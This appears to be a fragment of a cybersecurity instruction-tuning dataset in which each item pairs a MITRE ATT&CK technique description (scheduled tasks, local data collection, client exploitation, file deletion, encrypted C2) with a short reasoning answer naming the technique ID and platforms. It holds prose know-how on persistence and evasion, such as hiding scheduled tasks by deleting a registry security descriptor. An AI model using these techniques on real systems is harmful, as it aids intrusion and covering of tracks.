    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.",
    "context": "",
    "output": "The provided description is related to MITRE technique Scheduled Task/Job: Scheduled Task (T1053.005);\nTechnique Scheduled Task/Job: Scheduled Task (T1053.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated at utility could also be abused by adversaries (ex: At), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.",
      "answer": "The provided description is related to MITRE technique Scheduled Task/Job: Scheduled Task (T1053.005);\nTechnique Scheduled Task/Job: Scheduled Task (T1053.005) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a Command and Scripting Interpreter, such as cmd as well as a Network Device CLI, which have functionality to interact with the file system to gather information. Adversaries may also use Automated Collection on the local system.",
      "answer": "The provided description is related to MITRE technique Data from Local System (T1005);\nTechnique Data from Local System (T1005) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
    "context": "",
    "output": "The provided description is related to MITRE technique Exploitation for Client Execution (T1203);\nTechnique Exploitation for Client Execution (T1203) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
      "answer": "The provided description is related to MITRE technique Exploitation for Client Execution (T1203);\nTechnique Exploitation for Client Execution (T1203) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.",
      "answer": "The provided description is related to MITRE technique Indicator Removal: File Deletion (T1070.004);\nTechnique Indicator Removal: File Deletion (T1070.004) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
    "context": "",
    "output": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.",
      "answer": "The provided description is related to MITRE technique Encrypted Channel: Symmetric Cryptography (T1573.001);\nTechnique Encrypted Channel: Symmetric Cryptography (T1573.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  }
]